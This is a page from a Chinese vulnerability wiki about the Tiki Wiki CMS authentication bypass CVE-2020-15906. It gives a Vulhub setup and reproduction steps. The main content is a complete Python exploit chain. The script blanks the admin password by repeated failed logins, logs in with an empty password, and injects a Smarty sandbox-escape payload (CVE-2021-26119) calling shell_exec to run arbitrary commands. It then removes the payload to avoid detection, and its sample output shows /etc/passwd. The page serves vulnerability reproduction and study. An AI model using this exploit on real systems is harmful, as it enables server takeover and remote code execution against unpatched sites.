<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/Tiki%20Wiki%20CMS%20Groupware%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-15906/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Tiki Wiki CMS Groupware 认证绕过漏洞 CVE-2020-15906 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Tiki Wiki CMS Groupware \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e CVE-2020-15906", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../TypesetterCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../TypesetterCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
        TypesetterCMS 后台任意文件上传
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../ShopXO%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-15822/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../ShopXO%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-15822/" class="btn btn-xs btn-link">
        ShopXO download 任意文件读取漏洞 CNVD-2021-15822
      </a>
    </div>
    
  </div>

    

    <h1 id="tiki-wiki-cms-groupware-cve-2020-15906">Tiki Wiki CMS Groupware 认证绕过漏洞 CVE-2020-15906<a class="headerlink" href="#tiki-wiki-cms-groupware-cve-2020-15906" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Tiki Wiki CMS Groupware或简称为Tiki（最初称为TikiWiki）是一种免费且开源的基于Wiki的内容管理系统和在线办公套件。在如下这些版本21.2, 20.4, 19.3, 18.7, 17.3, 16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://info.tiki.org/article473-Security-Releases-of-all-Tiki-versions-since-16-3">https://info.tiki.org/article473-Security-Releases-of-all-Tiki-versions-since-16-3</a></li>
<li><a href="https://github.com/S1lkys/CVE-2020-15906">https://github.com/S1lkys/CVE-2020-15906</a></li>
<li><a href="http://packetstormsecurity.com/files/159663/Tiki-Wiki-CMS-Groupware-21.1-Authentication-Bypass.html">http://packetstormsecurity.com/files/159663/Tiki-Wiki-CMS-Groupware-21.1-Authentication-Bypass.html</a></li>
<li><a href="https://srcincite.io/pocs/cve-2021-26119.py.txt">https://srcincite.io/pocs/cve-2021-26119.py.txt</a></li>
</ul>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Vulhub执行如下命令启动一个Tiki Wiki CMS 21.1：</p>
<blockquote>
<p>需要通过<code>dos2unix docker-entrypoint.sh</code>命令将其转换成为unix格式文件。</p>
</blockquote>
<div class="highlight"><pre><span></span><code>docker-compose up -d
</code></pre></div>
<p>环境启动后，访问<code>http://your-ip:8080/tiki-login_scr.php</code>可以看到其欢迎页面。</p>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>我们可以使用https://srcincite.io/pocs/cve-2021-26119.py.txt中的<a href="https://github.com/vulhub/vulhub/blob/master/tikiwiki/CVE-2020-15906/poc.py">POC</a>进行复现。该POC先使用CVE-2020-15906绕过认证，获取管理员权限；再使用Smarty的沙盒绕过漏洞（CVE-2021-26119）于后台执行任意命令：</p>
<div class="highlight"><pre><span></span><code>python poc.py your-ip:8080 / id
</code></pre></div>
<p><img alt="image-20220302153818245" src="../images/202203021538346.png" /></p>
<p>注意，受到漏洞原理的影响，执行该POC会导致管理员账户被锁定。</p>
<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Tiki Wiki CMS GroupWare Serverside Template Injection Remote Code Execution Vulnerability</span>
<span class="sd">This is a demonstration of CVE-2021-26119 (Smarty Template Engine template_object Sandbox Escape PHP Code Injection)</span>
<span class="sd">Written by: Steven Seeley of Qihoo 360 Vulcan Team</span>
<span class="sd">Exploit tested against: Tiki Wiki 20.3 (Tarazed)</span>

<span class="sd">Bug 1: CVE-2020-15906</span>
<span class="sd">    - An unauthenticated user can bypass the authentication by bruteforcing the admin account &gt; 50 times and login with a blank password</span>
<span class="sd">    - Works on: &lt;= 21.1 (UY_Scuti)</span>

<span class="sd">Bug 2: CVE-2021-26119 </span>
<span class="sd">    - An admin user can trigger a serverside template injection and gain remote code execution by escaping the sandbox of the Smarty Template Engine by leveraging the &#39;template_object&#39; property</span>
<span class="sd">    - Works on: &lt;= 22.2 (Corona_Borealis) and impacts Smarty &lt;= 3.1.38 (latest)</span>

<span class="sd"># Notes</span>

<span class="sd">- *WARNING* This exploit will lock out the administrator account</span>
<span class="sd">- It was possible in older versions of Tiki Wiki (including 20.3) that you could:</span>

<span class="sd">  1. Edit Smarty templates with a user that had the &#39;tiki_p_edit_templates&#39; privilege, but Tiki clued into this and has since disabled this &#39;feature&#39; by default, see using [Risky preferences](https://doc.tiki.org/Risky-Preferences)</span>
<span class="sd">  2. Disable the Smarty sandbox entirely by unchecking the &quot;Smarty Security&quot; checkbox in the general security tab which is no longer possible.</span>

<span class="sd">  However it&#39;s still possible for an admin (or user with the &#39;tiki_p_admin&#39; permission assigned) to add Smarty template syntax to the &#39;feature_custom_html_head_content&#39; option under [Customization](http://doc.tiki.org/Customization) in the [Look and Feel](http://doc.tiki.org/Look-and-Feel) control panel menu. This is enough for attackers to escape the Smarty sandbox leveraging either CVE-2021-26119 or CVE-2021-26120 and execute arbitrary remote code.</span>

<span class="sd"># Example</span>

<span class="sd">researcher@incite:~/tiki$ ./poc.py</span>
<span class="sd">(+) usage: ./poc.py &lt;host&gt; &lt;path&gt; &lt;cmd&gt;</span>
<span class="sd">(+) eg: ./poc.py 192.168.75.141 / id</span>
<span class="sd">(+) eg: ./poc.py 192.168.75.141 /tiki-20.3/ id</span>

<span class="sd">researcher@incite:~/tiki$ ./poc.py 192.168.75.141 /tiki-20.3/ &quot;id;uname -a;pwd;head /etc/passwd&quot;</span>
<span class="sd">(+) blanking password...</span>
<span class="sd">(+) admin password blanked!</span>
<span class="sd">(+) getting a session...</span>
<span class="sd">(+) auth bypass successful!</span>
<span class="sd">(+) triggering rce...</span>

<span class="sd">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
<span class="sd">Linux target 5.8.0-40-generic #45-Ubuntu SMP Fri Jan 15 11:05:36 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
<span class="sd">/var/www/html/tiki-20.3</span>
<span class="sd">root:x:0:0:root:/root:/bin/bash</span>
<span class="sd">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="sd">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
<span class="sd">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
<span class="sd">sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="sd">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
<span class="sd">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
<span class="sd">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
<span class="sd">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
<span class="sd">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>

<span class="sd"># References</span>

<span class="sd">- Maximilian Barz&#39;s poc at https://github.com/S1lkys/CVE-2020-15906</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="k">def</span><span class="w"> </span><span class="nf">auth_bypass</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;referer&quot;</span> <span class="p">:</span> <span class="n">t</span> <span class="p">}</span>
    <span class="n">d</span><span class="p">[</span><span class="s2">&quot;ticket&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_ticket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-login.php&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">)</span>
    <span class="n">d</span><span class="p">[</span><span class="s2">&quot;pass&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="c1"># auth bypass is here</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-login.php&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">h</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-admin.php&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">)</span>
    <span class="k">assert</span> <span class="p">(</span><span class="s2">&quot;You do not have the permission that is needed&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">),</span> <span class="s2">&quot;(-) authentication bypass failed!&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">black_password</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-login.php&quot;</span> <span class="o">%</span> <span class="n">t</span>
    <span class="c1"># setup cookies here</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
    <span class="n">ticket</span> <span class="o">=</span> <span class="n">get_ticket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">uri</span><span class="p">)</span>
    <span class="c1"># crafted especially so unsuccessful_logins isn&#39;t recorded</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">51</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="s2">&quot;Account requires administrator approval.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) admin password blanked!&quot;</span><span class="p">)</span>
            <span class="k">return</span>
    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;(-) auth bypass failed!&quot;</span><span class="p">)</span> 

<span class="k">def</span><span class="w"> </span><span class="nf">get_ticket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">uri</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;referer&quot;</span> <span class="p">:</span> <span class="n">uri</span> <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;class=&quot;ticket&quot; name=&quot;ticket&quot; value=&quot;(.*)&quot; \/&gt;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">match</span><span class="p">,</span> <span class="s2">&quot;(-) csrf ticket leak failed!&quot;</span>
    <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">trigger_or_patch_ssti</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">c</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
    <span class="c1"># CVE-2021-26119</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="s2">&quot;look&quot;</span> <span class="p">}</span>
    <span class="n">h</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;referer&quot;</span> <span class="p">:</span> <span class="n">t</span> <span class="p">}</span>
    <span class="n">bypass</span> <span class="o">=</span> <span class="s2">&quot;startrce{$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#39;string:{shell_exec(</span><span class="se">\&quot;</span><span class="si">%s</span><span class="se">\&quot;</span><span class="s2">)}&#39;)}endrce&quot;</span> <span class="o">%</span> <span class="n">c</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;ticket&quot;</span> <span class="p">:</span> <span class="n">get_ticket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-admin.php&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">),</span>
        <span class="s2">&quot;feature_custom_html_head_content&quot;</span> <span class="p">:</span> <span class="n">bypass</span> <span class="k">if</span> <span class="n">c</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
        <span class="s2">&quot;lm_preference[]&quot;</span><span class="p">:</span> <span class="s2">&quot;feature_custom_html_head_content&quot;</span>
    <span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-admin.php&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">h</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">tiki-index.php&quot;</span> <span class="o">%</span> <span class="n">t</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
        <span class="k">assert</span> <span class="p">(</span><span class="s2">&quot;startrce&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s2">&quot;endrce&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">),</span> <span class="s2">&quot;(-) rce failed!&quot;</span>
        <span class="n">cmdr</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;startrce&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;endrce&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">cmdr</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>

<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) usage: </span><span class="si">%s</span><span class="s2"> &lt;host&gt; &lt;path&gt; &lt;cmd&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) eg: </span><span class="si">%s</span><span class="s2"> 192.168.75.141 / id&quot;</span><span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) eg: </span><span class="si">%s</span><span class="s2"> 192.168.75.141 /tiki-20.3/ id&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">return</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">p</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="k">else</span> <span class="n">p</span>
    <span class="n">p</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span> <span class="o">+</span> <span class="n">p</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">p</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="k">else</span> <span class="n">p</span>
    <span class="n">t</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">%s%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">p</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) blanking password...&quot;</span><span class="p">)</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> 
        <span class="s1">&#39;pass&#39;</span><span class="p">:</span><span class="s1">&#39;trololololol&#39;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">black_password</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) getting a session...&quot;</span><span class="p">)</span>
    <span class="n">auth_bypass</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) auth bypass successful!&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) triggering rce...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="c1"># trigger for rce</span>
    <span class="n">trigger_or_patch_ssti</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
    <span class="c1"># patch so we stay hidden</span>
    <span class="n">trigger_or_patch_ssti</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../TypesetterCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../TypesetterCMS%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
        TypesetterCMS 后台任意文件上传
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../ShopXO%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-15822/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../ShopXO%20download%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2021-15822/" class="btn btn-xs btn-link">
        ShopXO download 任意文件读取漏洞 CNVD-2021-15822
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>